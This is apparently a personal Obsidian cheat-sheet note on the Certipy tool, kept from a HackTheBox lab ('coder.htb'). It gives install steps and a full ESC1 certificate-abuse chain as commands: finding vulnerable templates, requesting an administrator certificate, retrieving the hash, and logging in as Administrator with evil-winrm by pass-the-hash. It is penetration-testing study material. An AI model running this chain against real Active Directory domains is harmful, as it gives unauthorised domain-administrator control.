---
creation date: April 7th 2023
last modified date: April 7th 2023
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[Certipy]]  
___

## Description:
[Certipy](https://github.com/ly4k/Certipy)

## Installation
```
pip3 install certipy-ad
```
or
```
git clone https://github.com/ly4k/Certipy                                                                                      
python -m venv Certipy                                                  
source Certipy/bin/activate                                             
pip install .  
```

## Commands

**Find all certs**
```
/home/kali/.local/bin/certipy find -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207
```
**find vulnerable**
```
/home/kali/.local/bin/certipy find -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 -stdout -vulnerable
```


ECS1:
```
/home/kali/.local/bin/certipy find -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 -stdout -vulnerable

/home/kali/.local/bin/certipy req -u e.black@coder.htb -p ypOSJXPqlDOxxbQSfEERy300 -dc-ip 10.10.11.207 -template ESC1 -ca coder-DC01-CA -upn administrator@coder.htb

sudo ntpdate -u 10.10.11.207

/home/kali/.local/bin/certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'coder.htb' -dc-ip 10.10.11.207

evil-winrm -i coder.htb -u Administrator -H 'inputhashhere'
```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: April 7th 2023 (03:48 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
